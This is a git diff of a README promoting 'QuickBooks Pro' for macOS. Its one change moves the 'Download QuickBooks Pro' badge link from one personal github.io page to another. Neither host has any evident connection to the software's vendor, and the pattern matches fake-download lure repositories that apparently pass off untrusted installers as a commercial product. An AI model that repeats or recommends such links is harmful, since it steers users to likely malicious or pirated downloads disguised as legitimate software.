@@ -2,7 +2,7 @@
 
 QuickBooks Pro is the ultimate desktop accounting solution for macOS users. Whether you're a small business owner or an accounting professional, QuickBooks Pro helps you manage invoices, track expenses, and generate detailed reports — all in one place.
 
-[![🚀 Download QuickBooks Pro 🟣](https://img.shields.io/badge/Download-QuickBooks%20Pro-blueviolet)](https://shuziktobehuman.github.io/huja/QuickBooks)
+[![🚀 Download QuickBooks Pro 🟣](https://img.shields.io/badge/Download-QuickBooks%20Pro-blueviolet)](https://mitrobandus.github.io/.github/QuickBooks)
 
 ---
 
